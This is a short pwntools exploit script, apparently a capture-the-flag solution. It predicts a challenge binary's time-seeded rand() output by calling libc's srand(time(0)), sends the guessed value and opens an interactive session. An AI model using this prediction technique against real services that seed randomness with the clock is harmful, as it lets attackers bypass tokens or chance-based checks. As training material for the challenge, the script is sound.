from ctypes import CDLL, c_long
from random import seed
from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
libcc = CDLL('./libc.so.6')

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)
    return r

def main():
    r = conn()

    # Define the time function signature
    libcc.time.argtypes = [c_long]  # time_t *t (or NULL)
    libcc.time.restype = c_long     # time_t return type

    # Call time(0) to get the current time
    seed = libcc.time(0)
    libcc.srand(seed)
    nhonks = libcc.rand() % 0x5b + 10
    print(f"Calculated nhonks: {nhonks}")

    # Send the calculated nhonks to the binary
    r.sendline(str(nhonks))

    # Interact with the binary
    r.interactive()

if __name__ == "__main__":
    main()